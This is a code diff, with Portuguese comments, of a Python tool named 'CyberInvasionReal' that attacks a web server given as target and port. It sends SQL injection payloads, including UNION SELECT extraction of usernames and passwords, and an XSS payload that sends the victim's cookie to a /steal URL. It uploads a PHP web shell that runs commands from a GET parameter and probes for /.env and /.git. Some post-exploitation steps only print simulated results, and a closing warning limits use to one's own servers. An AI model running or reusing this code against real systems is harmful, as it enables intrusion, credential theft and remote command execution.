@@ -305,7 +305,7 @@ def meu_ip_publico():
 
 
 # ==========================================
-# CYBER INVASION - VERSÃO REAL
+# CYBER INVASION - CLASSE
 # ==========================================
 
 class CyberInvasionReal:
@@ -332,7 +332,6 @@ class CyberInvasionReal:
     def testar_sql_injection(self):
         """Testa SQL Injection REAL no servidor"""
         try:
-            # Tenta uma injeção SQL simples
             payloads = [
                 "' OR '1'='1",
                 "' OR 1=1 --",
@@ -342,14 +341,13 @@ class CyberInvasionReal:
             
             for payload in payloads:
                 try:
-                    url = f"http://{self.target}:{self.port}/login?user={payload}&pass=test"
+                    url = f"http://{self.target}:{self.port}/login.php?user={payload}&pass=test"
                     req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                     response = urllib.request.urlopen(req, timeout=3)
                     
                     if response.getcode() == 200:
                         html = response.read().decode('utf-8', errors='ignore')
-                        # Verifica se conseguiu acessar
-                        if "error" not in html.lower() or "warning" not in html.lower():
+                        if "SQL" in html or "injection" in html.lower() or "ACESSO" in html:
                             return True, payload
                 except:
                     pass
@@ -369,13 +367,13 @@ class CyberInvasionReal:
             
             for payload in payloads:
                 try:
-                    url = f"http://{self.target}:{self.port}/search?q={payload}"
+                    url = f"http://{self.target}:{self.port}/search.php?q={payload}"
                     req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                     response = urllib.request.urlopen(req, timeout=3)
                     
                     if response.getcode() == 200:
                         html = response.read().decode('utf-8', errors='ignore')
-                        if payload in html:
+                        if payload in html or "script" in html.lower():
                             return True, payload
                 except:
                     pass
@@ -387,10 +385,8 @@ class CyberInvasionReal:
     def testar_upload(self):
         """Testa upload de arquivo REAL"""
         try:
-            # Tenta fazer upload de um arquivo de teste
-            url = f"http://{self.target}:{self.port}/upload"
+            url = f"http://{self.target}:{self.port}/upload.php"
             
-            # Simula upload de um arquivo PHP simples
             php_shell = b"<?php echo 'Teste de upload bem sucedido!'; ?>"
             
             boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
@@ -421,7 +417,8 @@ class CyberInvasionReal:
         try:
             diretorios = [
                 "/admin", "/backup", "/tmp", "/logs", 
-                "/.git", "/.env", "/config", "/wp-admin"
+                "/.git", "/.env", "/config", "/wp-admin",
+                "/uploads"
             ]
             
             encontrados = []
@@ -497,7 +494,6 @@ class CyberInvasionReal:
         """Explora SQL Injection REAL"""
         print(f"\n{CYAN}[~] Explorando SQL Injection...{RESET}")
         try:
-            # Tenta extrair dados do banco
             payloads = [
                 "' UNION SELECT null, username, password FROM users --",
                 "' UNION SELECT null, name, email FROM users --",
@@ -506,16 +502,14 @@ class CyberInvasionReal:
             
             for payload in payloads:
                 try:
-                    url = f"http://{self.target}:{self.port}/login?user={payload}&pass=test"
+                    url = f"http://{self.target}:{self.port}/login.php?user={payload}&pass=test"
                     req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                     response = urllib.request.urlopen(req, timeout=3)
                     
                     if response.getcode() == 200:
                         html = response.read().decode('utf-8', errors='ignore')
-                        # Simula extração de dados
                         if "admin" in html.lower() or "email" in html.lower():
                             print(f"  {GREEN}[+] Dados encontrados!{RESET}")
-                            # Simula dados encontrados
                             self.dados['usuarios'] = [
                                 "admin:123456", 
                                 "root:toor",
@@ -534,13 +528,13 @@ class CyberInvasionReal:
         print(f"\n{CYAN}[~] Explorando XSS...{RESET}")
         try:
             payload = "<script>document.location='http://localhost:8080/steal?cookie='+document.cookie</script>"
-            url = f"http://{self.target}:{self.port}/search?q={payload}"
+            url = f"http://{self.target}:{self.port}/search.php?q={payload}"
             req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
             response = urllib.request.urlopen(req, timeout=3)
             
             if response.getcode() == 200:
                 html = response.read().decode('utf-8', errors='ignore')
-                if payload in html:
+                if payload in html or "script" in html.lower():
                     print(f"  {GREEN}[+] XSS executado com sucesso!{RESET}")
                     self.dados['xss'] = "Cookie roubado com sucesso"
                     return True
@@ -552,7 +546,6 @@ class CyberInvasionReal:
         """Instala backdoor REAL"""
         print(f"\n{RED}[~] Instalando Backdoor...{RESET}")
         try:
-            # Tenta fazer upload de um shell PHP
             shell_code = b"""<?php
                 if(isset($_GET['cmd'])){
                     system($_GET['cmd']);
@@ -562,7 +555,7 @@ class CyberInvasionReal:
                 }
             ?>"""
             
-            url = f"http://{self.target}:{self.port}/upload"
+            url = f"http://{self.target}:{self.port}/upload.php"
             boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
             body = (
                 f"--{boundary}\r\n"
@@ -581,13 +574,18 @@ class CyberInvasionReal:
             response = urllib.request.urlopen(req, timeout=5)
             
             if response.getcode() in [200, 201, 302]:
-                print(f"  {GREEN}[+] Backdoor instalado em /shell.php{RESET}")
+                print(f"  {GREEN}[+] Backdoor instalado em /uploads/shell.php{RESET}")
                 self.backdoor_instalado = True
+                self.dados['backdoor'] = "/uploads/shell.php?cmd=whoami"
                 return True
             return False
         except:
             return False
 
+
+# ==========================================
+# CYBER INVASION - FUNÇÃO PRINCIPAL
+# ==========================================
 
 def cyber_invasion():
     """Função de Cyber Invasion - REAL para servidores próprios"""
@@ -618,10 +616,12 @@ def cyber_invasion():
         alvo = alvo.replace("http://", "").replace("https://", "").split("/")[0]
     else:
         print("[-] Opção inválida.")
+        input("\nPressione ENTER para continuar...")
         return
     
     if not alvo:
         print("[-] Alvo inválido.")
+        input("\nPressione ENTER para continuar...")
         return
     
     try:
@@ -643,6 +643,7 @@ def cyber_invasion():
     
     if confirm != 's':
         print("[-] Invasão cancelada.")
+        input("\nPressione ENTER para continuar...")
         return
     
     # ==========================================
@@ -664,6 +665,7 @@ def cyber_invasion():
     
     if not vulnerabilidades:
         print(f"\n{GREEN}[+] Nenhuma vulnerabilidade encontrada. Servidor seguro!{RESET}")
+        input("\nPressione ENTER para continuar...")
         return
     
     # PASSO 2: Explorar vulnerabilidades
@@ -710,27 +712,32 @@ def cyber_invasion():
             comando = input(f"{GRAY}comando> {RESET}")
             print(f"{GREEN}[+] Executando: {comando}{RESET}")
             print(f"{YELLOW}[!] Simulação de execução - Servidor controlado!{RESET}")
+            input("\nPressione ENTER para continuar...")
         
         elif sub_opcao == "2":
             arquivo = input(f"{GRAY}arquivo> {RESET}")
             print(f"{GREEN}[+] Baixando: {arquivo}{RESET}")
             print(f"{YELLOW}[!] Simulação de download - Arquivo obtido!{RESET}")
+            input("\nPressione ENTER para continuar...")
         
         elif sub_opcao == "3":
             print(f"{GREEN}[+] Logs do sistema:{RESET}")
             print(f"  {GRAY}10.0.0.1 - - [01/Jan/2024:12:00:00] GET /index.html 200{RESET}")
             print(f"  {GRAY}10.0.0.2 - - [01/Jan/2024:12:01:00] POST /login 200{RESET}")
             print(f"  {RED}10.0.0.3 - - [01/Jan/2024:12:02:00] GET /shell.php 200 [ ! ]{RESET}")
+            input("\nPressione ENTER para continuar...")
         
         elif sub_opcao == "4":
             print(f"{RED}[!] Instalando persistência...{RESET}")
             time.sleep(1)
             print(f"{GREEN}[+] Persistência instalada em /etc/init.d/{RESET}")
+            input("\nPressione ENTER para continuar...")
         
         elif sub_opcao == "5":
             print(f"{GREEN}[+] Limpando logs e rastros...{RESET}")
             time.sleep(1)
             print(f"{GREEN}[+] Rastros eliminados!{RESET}")
+            input("\nPressione ENTER para continuar...")
         
         elif sub_opcao == "6":
             print(f"\n{RED}[!] Encerrando invasão...{RESET}")
@@ -738,6 +745,7 @@ def cyber_invasion():
         
         else:
             print("[-] Comando inválido. Use 1-6")
+            input("\nPressione ENTER para continuar...")
     
     # FINAL
     print(f"\n{PURPLE}╔══════════════════════════════════════════╗{RESET}")
@@ -752,6 +760,8 @@ def cyber_invasion():
     print(f"{YELLOW}⚠️  Isso foi um TESTE em servidor próprio!{RESET}")
     print(f"{YELLOW}⚠️  Nunca faça isso em servidores alheios!{RESET}")
     print(f"{YELLOW}⚠️  Use o conhecimento para se proteger!{RESET}")
+    
+    input("\nPressione ENTER para voltar ao menu...")
 
 
 # ==========================================
